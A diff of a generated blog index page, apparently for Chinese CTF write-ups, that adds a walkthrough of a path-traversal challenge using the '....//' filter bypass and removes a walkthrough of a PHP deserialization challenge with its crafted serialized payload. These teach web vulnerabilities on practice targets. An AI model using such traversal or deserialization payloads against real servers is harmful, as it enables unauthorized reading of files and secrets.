@@ -1805,6 +1805,8 @@
       
         
       
+        
+      
     
     
     
@@ -2462,6 +2464,36 @@
   
   
     <li class="md-nav__item">
+      <a href="../../category/%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    路径遍历
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
       <a href="../../category/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" class="md-nav__link">
         
   
@@ -2599,6 +2631,140 @@
       <header class="md-typeset">
         <h1 id="2026">2026<a class="headerlink" href="#2026" title="Permanent link">&para;</a></h1>
       </header>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
+          <time datetime="2026-10-29 00:00:00+00:00">2026-10-29</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="../../category/%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/" class="md-meta__link">路径遍历</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 2 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="writeup"><a class="toclink" href="../../stitch-file-previewer/">史迪仔的文件预览器 — Writeup</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：Web — 目录穿越（Path Traversal）</p>
+<p><strong>题目地址</strong>：<code>http://80-e887e1a6-2d07-4b5b-9e6e-5d3e06543451.challenge.ctfplus.cn/</code></p>
+<p><strong>Flag</strong>：<code>flag{1f0be3ba-b8f6-4a5a-9b05-c8d69e8769fd}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="../../stitch-file-previewer/#_1">题目概述</a></h3>
+<p>页面是一个"文件预览器"，输入文件名即可查看实验室资料。默认提供示例文件 <code>hello.txt</code>。</p>
+<hr />
+<h3 id="_2"><a class="toclink" href="../../stitch-file-previewer/#_2">解题过程</a></h3>
+<h4 id="step-1"><a class="toclink" href="../../stitch-file-previewer/#step-1">Step 1：查看默认文件</a></h4>
+<p>先访问默认的 <code>hello.txt</code>，内容如下：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>Hello, ZeroG!
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>Welcome to PwnStars Cybersecurity Lab.
+</span></code></pre></div>
+<p>没有有用信息，只是普通的欢迎语。</p>
+<h4 id="step-2"><a class="toclink" href="../../stitch-file-previewer/#step-2">Step 2：查看源码，发现线索</a></h4>
+<p>右键查看页面源代码，在 HTML 底部发现一行注释：</p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="cm">&lt;!-- TODO: README.txt 后续需要整理 --&gt;</span>
+</span></code></pre></div>
+<p><img alt="源码中的注释" src="../../../assets/images/stitch-file-previewer/02-source-comment.png" /></p>
+<p>这说明服务器上存在一个 <code>README.txt</code> 文件，但页面上没有直接暴露。</p>
+<h4 id="step-3-readmetxt"><a class="toclink" href="../../stitch-file-previewer/#step-3-readmetxt">Step 3：直接读取 README.txt — 失败</a></h4>
+<p>在文件名输入框中输入 <code>README.txt</code>，返回：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>File not found.
+</span></code></pre></div>
+<p>说明 README.txt 不在当前可读目录中。</p>
+<h4 id="step-4"><a class="toclink" href="../../stitch-file-previewer/#step-4">Step 4：尝试目录穿越</a></h4>
+<p>既然文件不在当前目录，尝试使用 <code>../</code> 进行目录穿越：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>../README.txt
+</span></code></pre></div>
+<p>仍然返回 <code>File not found.</code>，说明服务器对 <code>../</code> 进行了过滤（替换为空）。</p>
+<h4 id="step-5-readmetxt"><a class="toclink" href="../../stitch-file-previewer/#step-5-readmetxt">Step 5：绕过过滤 — 成功读取 README.txt</a></h4>
+<p>服务器只做了一次 <code>../</code> → 空的替换，可以利用双写绕过。输入：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>....//README.txt
+</span></code></pre></div>
+<p>服务器将中间的 <code>../</code> 删除后，剩余字符重新拼成 <code>../README.txt</code>，成功读到文件内容：</p>
+<p><img alt="读取到 README.txt" src="../../../assets/images/stitch-file-previewer/03-readme.png" /></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>Stitch File Preview System
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>Public files are stored in /files/.
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>For administrators:
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>Sensitive files are stored in /secret/.
+</span></code></pre></div>
+<p>README.txt 揭示了目录结构：</p>
+<ul>
+<li>公开文件存储在 <code>/files/</code></li>
+<li><strong>敏感文件存储在 <code>/secret/</code></strong></li>
+</ul>
+<h4 id="step-6-secret-flag"><a class="toclink" href="../../stitch-file-previewer/#step-6-secret-flag">Step 6：读取 /secret/ 下的 flag</a></h4>
+<p>既然知道敏感文件在 <code>/secret/</code> 目录下，CTF 中常见的 flag 文件名就是 <code>flag.txt</code>。使用同样的绕过方式构造路径：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>....//secret/flag.txt
+</span></code></pre></div>
+<p>成功拿到 flag：</p>
+<p><img alt="拿到 flag" src="../../../assets/images/stitch-file-previewer/04-flag.png" /></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>flag{1f0be3ba-b8f6-4a5a-9b05-c8d69e8769fd}
+</span></code></pre></div>
+<hr />
+<h3 id="_3"><a class="toclink" href="../../stitch-file-previewer/#_3">解题思路总结</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>访问 hello.txt（无有用信息）
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>  → 查看源码，发现 HTML 注释提到 README.txt
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>    → 直接读 README.txt 失败（文件不在当前目录）
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>      → 尝试 ../ 目录穿越，失败（被过滤）
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>        → 用 ....// 双写绕过过滤，成功读取 README.txt
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>          → 发现敏感文件在 /secret/ 目录
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>            → ....//secret/flag.txt 读到 flag
+</span></code></pre></div>
+<h4 id="_4"><a class="toclink" href="../../stitch-file-previewer/#_4">漏洞原理</a></h4>
+<p>服务器对用户输入的 <code>file</code> 参数进行了简单的过滤 —— 将 <code>../</code> 替换为空字符串。但这个过滤<strong>只执行一次</strong>，攻击者可以通过双写 <code>....//</code> 来绕过：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>输入:      ....//README.txt
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>过滤后:    ../README.txt    （中间的 ../ 被删除，两侧的 . 和 / 重新拼合）
+</span></code></pre></div>
+<h4 id="_5"><a class="toclink" href="../../stitch-file-previewer/#_5">关键知识点</a></h4>
+<table>
+<thead>
+<tr>
+<th>知识点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>查看源码</td>
+<td>HTML 注释中经常藏有线索</td>
+</tr>
+<tr>
+<td>目录穿越</td>
+<td>利用 <code>../</code> 跳出当前目录读取其他文件</td>
+</tr>
+<tr>
+<td>过滤绕过</td>
+<td>双写 <code>....//</code> 绕过单次 <code>../</code> 替换过滤</td>
+</tr>
+<tr>
+<td>信息收集</td>
+<td>利用已读到的文件内容（README.txt）获取目录结构信息</td>
+</tr>
+</tbody>
+</table>
+    
+    
+  </div>
+</article>
       
         <article class="md-post md-post--excerpt">
   <header class="md-post__header">
@@ -3687,178 +3853,6 @@
 </tr>
 </tbody>
 </table>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-10-25 00:00:00+00:00">2026-10-25</time></li>
-        
-          <li class="md-meta__item">
-            分类于
-            
-              <a href="../../category/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-meta__link">反序列化</a></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              需要 2 分钟阅读时间
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="dasctf-filehandler"><a class="toclink" href="../../dasctf-ezphp-deserialize/">[DASCTF] FileHandler 反序列化</a></h2>
-<p>打开题目直接就是源码，<code>highlight_file</code> 把整个文件摊出来了。先审计。</p>
-<p><img alt="题目源码" src="../../../assets/images/dasctf-ezphp/01-source.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="cp">&lt;?php</span>
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="k">include</span><span class="p">(</span><span class="s2">"flag.php"</span><span class="p">);</span>
-</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>
-</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="k">class</span> <span class="nc">FileHandler</span> <span class="p">{</span>
-</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>    <span class="k">protected</span> <span class="nv">$op</span><span class="p">;</span>
-</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>    <span class="k">protected</span> <span class="nv">$filename</span><span class="p">;</span>
-</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>    <span class="k">protected</span> <span class="nv">$content</span><span class="p">;</span>
-</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>
-</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
-</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>        <span class="nv">$op</span> <span class="o">=</span> <span class="s2">"1"</span><span class="p">;</span>
-</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>        <span class="nv">$filename</span> <span class="o">=</span> <span class="s2">"/tmp/tmpfile"</span><span class="p">;</span>
-</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>        <span class="nv">$content</span> <span class="o">=</span> <span class="s2">"Hello World!"</span><span class="p">;</span>
-</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">process</span><span class="p">();</span>
-</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a>    <span class="p">}</span>
-</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a>
-</span><span id="__span-7-17"><a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a>    <span class="k">public</span> <span class="k">function</span> <span class="nf">process</span><span class="p">()</span> <span class="p">{</span>
-</span><span id="__span-7-18"><a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a>        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">op</span> <span class="o">==</span> <span class="s2">"1"</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-7-19"><a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">();</span>
-</span><span id="__span-7-20"><a id="__codelineno-7-20" name="__codelineno-7-20" href="#__codelineno-7-20"></a>        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">op</span> <span class="o">==</span> <span class="s2">"2"</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-7-21"><a id="__codelineno-7-21" name="__codelineno-7-21" href="#__codelineno-7-21"></a>            <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">();</span>
-</span><span id="__span-7-22"><a id="__codelineno-7-22" name="__codelineno-7-22" href="#__codelineno-7-22"></a>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">output</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
-</span><span id="__span-7-23"><a id="__codelineno-7-23" name="__codelineno-7-23" href="#__codelineno-7-23"></a>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span><span id="__span-7-24"><a id="__codelineno-7-24" name="__codelineno-7-24" href="#__codelineno-7-24"></a>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">output</span><span class="p">(</span><span class="s2">"Bad Hacker!"</span><span class="p">);</span>
-</span><span id="__span-7-25"><a id="__codelineno-7-25" name="__codelineno-7-25" href="#__codelineno-7-25"></a>        <span class="p">}</span>
-</span><span id="__span-7-26"><a id="__codelineno-7-26" name="__codelineno-7-26" href="#__codelineno-7-26"></a>    <span class="p">}</span>
-</span><span id="__span-7-27"><a id="__codelineno-7-27" name="__codelineno-7-27" href="#__codelineno-7-27"></a>
-</span><span id="__span-7-28"><a id="__codelineno-7-28" name="__codelineno-7-28" href="#__codelineno-7-28"></a>    <span class="k">private</span> <span class="k">function</span> <span class="nf">write</span><span class="p">()</span> <span class="p">{</span>
-</span><span id="__span-7-29"><a id="__codelineno-7-29" name="__codelineno-7-29" href="#__codelineno-7-29"></a>        <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">))</span> <span class="p">{</span>
-</span><span id="__span-7-30"><a id="__codelineno-7-30" name="__codelineno-7-30" href="#__codelineno-7-30"></a>            <span class="k">if</span><span class="p">(</span><span class="nb">strlen</span><span class="p">((</span><span class="nx">string</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-7-31"><a id="__codelineno-7-31" name="__codelineno-7-31" href="#__codelineno-7-31"></a>                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">output</span><span class="p">(</span><span class="s2">"Too long!"</span><span class="p">);</span>
-</span><span id="__span-7-32"><a id="__codelineno-7-32" name="__codelineno-7-32" href="#__codelineno-7-32"></a>                <span class="k">die</span><span class="p">();</span>
-</span><span id="__span-7-33"><a id="__codelineno-7-33" name="__codelineno-7-33" href="#__codelineno-7-33"></a>            <span class="p">}</span>
-</span><span id="__span-7-34"><a id="__codelineno-7-34" name="__codelineno-7-34" href="#__codelineno-7-34"></a>            <span class="nv">$res</span> <span class="o">=</span> <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
-</span><span id="__span-7-35"><a id="__codelineno-7-35" name="__codelineno-7-35" href="#__codelineno-7-35"></a>            <span class="o">...</span>
-</span><span id="__span-7-36"><a id="__codelineno-7-36" name="__codelineno-7-36" href="#__codelineno-7-36"></a>        <span class="p">}</span>
-</span><span id="__span-7-37"><a id="__codelineno-7-37" name="__codelineno-7-37" href="#__codelineno-7-37"></a>    <span class="p">}</span>
-</span><span id="__span-7-38"><a id="__codelineno-7-38" name="__codelineno-7-38" href="#__codelineno-7-38"></a>
-</span><span id="__span-7-39"><a id="__codelineno-7-39" name="__codelineno-7-39" href="#__codelineno-7-39"></a>    <span class="k">private</span> <span class="k">function</span> <span class="nf">read</span><span class="p">()</span> <span class="p">{</span>
-</span><span id="__span-7-40"><a id="__codelineno-7-40" name="__codelineno-7-40" href="#__codelineno-7-40"></a>        <span class="nv">$res</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
-</span><span id="__span-7-41"><a id="__codelineno-7-41" name="__codelineno-7-41" href="#__codelineno-7-41"></a>        <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">))</span> <span class="p">{</span>
-</span><span id="__span-7-42"><a id="__codelineno-7-42" name="__codelineno-7-42" href="#__codelineno-7-42"></a>            <span class="nv">$res</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
-</span><span id="__span-7-43"><a id="__codelineno-7-43" name="__codelineno-7-43" href="#__codelineno-7-43"></a>        <span class="p">}</span>
-</span><span id="__span-7-44"><a id="__codelineno-7-44" name="__codelineno-7-44" href="#__codelineno-7-44"></a>        <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span>
-</span><span id="__span-7-45"><a id="__codelineno-7-45" name="__codelineno-7-45" href="#__codelineno-7-45"></a>    <span class="p">}</span>
-</span><span id="__span-7-46"><a id="__codelineno-7-46" name="__codelineno-7-46" href="#__codelineno-7-46"></a>
-</span><span id="__span-7-47"><a id="__codelineno-7-47" name="__codelineno-7-47" href="#__codelineno-7-47"></a>    <span class="k">private</span> <span class="k">function</span> <span class="nf">output</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-7-48"><a id="__codelineno-7-48" name="__codelineno-7-48" href="#__codelineno-7-48"></a>        <span class="k">echo</span> <span class="s2">"[Result]: &lt;br&gt;"</span><span class="p">;</span>
-</span><span id="__span-7-49"><a id="__codelineno-7-49" name="__codelineno-7-49" href="#__codelineno-7-49"></a>        <span class="k">echo</span> <span class="nv">$s</span><span class="p">;</span>
-</span><span id="__span-7-50"><a id="__codelineno-7-50" name="__codelineno-7-50" href="#__codelineno-7-50"></a>    <span class="p">}</span>
-</span><span id="__span-7-51"><a id="__codelineno-7-51" name="__codelineno-7-51" href="#__codelineno-7-51"></a>
-</span><span id="__span-7-52"><a id="__codelineno-7-52" name="__codelineno-7-52" href="#__codelineno-7-52"></a>    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
-</span><span id="__span-7-53"><a id="__codelineno-7-53" name="__codelineno-7-53" href="#__codelineno-7-53"></a>        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">op</span> <span class="o">===</span> <span class="s2">"2"</span><span class="p">)</span>
-</span><span id="__span-7-54"><a id="__codelineno-7-54" name="__codelineno-7-54" href="#__codelineno-7-54"></a>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">op</span> <span class="o">=</span> <span class="s2">"1"</span><span class="p">;</span>
-</span><span id="__span-7-55"><a id="__codelineno-7-55" name="__codelineno-7-55" href="#__codelineno-7-55"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
-</span><span id="__span-7-56"><a id="__codelineno-7-56" name="__codelineno-7-56" href="#__codelineno-7-56"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">process</span><span class="p">();</span>
-</span><span id="__span-7-57"><a id="__codelineno-7-57" name="__codelineno-7-57" href="#__codelineno-7-57"></a>    <span class="p">}</span>
-</span><span id="__span-7-58"><a id="__codelineno-7-58" name="__codelineno-7-58" href="#__codelineno-7-58"></a><span class="p">}</span>
-</span><span id="__span-7-59"><a id="__codelineno-7-59" name="__codelineno-7-59" href="#__codelineno-7-59"></a>
-</span><span id="__span-7-60"><a id="__codelineno-7-60" name="__codelineno-7-60" href="#__codelineno-7-60"></a><span class="k">function</span> <span class="nf">is_valid</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-7-61"><a id="__codelineno-7-61" name="__codelineno-7-61" href="#__codelineno-7-61"></a>    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
-</span><span id="__span-7-62"><a id="__codelineno-7-62" name="__codelineno-7-62" href="#__codelineno-7-62"></a>        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$s</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">&gt;=</span> <span class="mi">32</span> <span class="o">&amp;&amp;</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$s</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">&lt;=</span> <span class="mi">125</span><span class="p">))</span>
-</span><span id="__span-7-63"><a id="__codelineno-7-63" name="__codelineno-7-63" href="#__codelineno-7-63"></a>            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
-</span><span id="__span-7-64"><a id="__codelineno-7-64" name="__codelineno-7-64" href="#__codelineno-7-64"></a>    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
-</span><span id="__span-7-65"><a id="__codelineno-7-65" name="__codelineno-7-65" href="#__codelineno-7-65"></a><span class="p">}</span>
-</span><span id="__span-7-66"><a id="__codelineno-7-66" name="__codelineno-7-66" href="#__codelineno-7-66"></a>
-</span><span id="__span-7-67"><a id="__codelineno-7-67" name="__codelineno-7-67" href="#__codelineno-7-67"></a><span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">{</span><span class="s1">'str'</span><span class="p">}))</span> <span class="p">{</span>
-</span><span id="__span-7-68"><a id="__codelineno-7-68" name="__codelineno-7-68" href="#__codelineno-7-68"></a>    <span class="nv">$str</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'str'</span><span class="p">];</span>
-</span><span id="__span-7-69"><a id="__codelineno-7-69" name="__codelineno-7-69" href="#__codelineno-7-69"></a>    <span class="k">if</span><span class="p">(</span><span class="nx">is_valid</span><span class="p">(</span><span class="nv">$str</span><span class="p">))</span> <span class="p">{</span>
-</span><span id="__span-7-70"><a id="__codelineno-7-70" name="__codelineno-7-70" href="#__codelineno-7-70"></a>        <span class="nv">$obj</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
-</span><span id="__span-7-71"><a id="__codelineno-7-71" name="__codelineno-7-71" href="#__codelineno-7-71"></a>    <span class="p">}</span>
-</span><span id="__span-7-72"><a id="__codelineno-7-72" name="__codelineno-7-72" href="#__codelineno-7-72"></a><span class="p">}</span>
-</span></code></pre></div>
-<h3 id="_1"><a class="toclink" href="../../dasctf-ezphp-deserialize/#_1">判断</a></h3>
-<p><strong>第一件事：<code>include("flag.php")</code> 说明 flag 和入口同目录，而且我们要的是它的源码，不是执行结果。</strong></p>
-<p><code>file_get_contents</code> 不走 PHP 解析器，读出来就是磁盘上的原文。这一点是这题的关键 —— 不是去读"执行后输出"，是直接把文件读出来。</p>
-<p><strong>第二件事：只有 <code>read()</code> 能读文件，怎么进去？</strong></p>
-<p>入口只有 <code>unserialize</code>，唯一的触发点是 <code>__destruct</code>：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>__destruct() → process() → read()
-</span></code></pre></div>
-<p>但中间有两道类型检查：</p>
-<table>
-<thead>
-<tr>
-<th>位置</th>
-<th>写法</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>__destruct</code></td>
-<td><code>$this-&gt;op === "2"</code> <strong>强比较</strong></td>
-<td>字符串 <code>"2"</code> 会被改成 <code>"1"</code>，走 write</td>
-</tr>
-<tr>
-<td><code>process</code></td>
-<td><code>$this-&gt;op == "2"</code> <strong>弱比较</strong></td>
-<td>整数 <code>2</code> 也成立，走 read</td>
-</tr>
-</tbody>
-</table>
-<p>所以 <code>op</code> 必须序列化成<strong>整数</strong>：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>s:2:"op";i:2;
-</span></code></pre></div>
-<p><strong>第三件事：属性是 <code>protected</code>，怎么绕 <code>is_valid</code>？</strong></p>
-<p><code>protected</code> 属性序列化后是 <code>\0*\0op</code>（两个空字节夹一个星号），而 <code>is_valid</code> 卡的是 <code>ord() &gt;= 32</code>，空字节 <code>ord = 0</code> 直接被拒。</p>
-<p>但这题<strong>根本不用碰空字节</strong> —— <code>unserialize</code> 不对属性做检验，所以构建序列化串的时候直接用 public 属性名就行，<code>protected $op</code> 一样写得进去：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>s:2:"op";i:2;        ← 属性是 protected，但这里按 public 写
-</span></code></pre></div>
-<h3 id="payload"><a class="toclink" href="../../dasctf-ezphp-deserialize/#payload">最终 payload</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>/?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";s:0:"";}
-</span></code></pre></div>
-<p>返回：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>[Result]: &lt;br&gt;&lt;?php $flag='CTF2{a8da662d-ba4e-44da-9655-ffd89b301ecb}';
-</span></code></pre></div>
-<p><img alt="拿到 flag" src="../../../assets/images/dasctf-ezphp/03-flag.png" /></p>
-<h3 id="_2"><a class="toclink" href="../../dasctf-ezphp-deserialize/#_2">页面为什么看着什么都没有</a></h3>
-<p>两个原因叠在一起：</p>
-<ol>
-<li><strong>浏览器把 <code>&lt;?</code> 当成 bogus comment（无效注释）</strong>，一路吞到下一个 <code>&gt;</code>，所以这段字不在渲染结果里 —— <code>Ctrl+U</code> 看源代码就有；</li>
-<li><strong><code>__destruct</code> 是在脚本结束时才触发的</strong>，输出天然追加在页面最末尾、<code>highlight_file</code> 的源码后面。</li>
-</ol>
-<h3 id="_3"><a class="toclink" href="../../dasctf-ezphp-deserialize/#_3">收获</a></h3>
-<ul>
-<li><strong>同一个属性在不同位置可以是不同类型检查</strong>：<code>=== "2"</code> 拦字符串，<code>== "2"</code> 收整数。找"哪个类型能同时过两道"比硬刚一个点快。</li>
-<li><strong><code>unserialize</code> 不做可见性检查</strong>：<code>protected</code> / <code>private</code> 的空字节前缀不是必须的，public 名字一样能写进去。序列化里的可见性前缀只影响"生成时怎么写"，不限制"解析时怎么读"。</li>
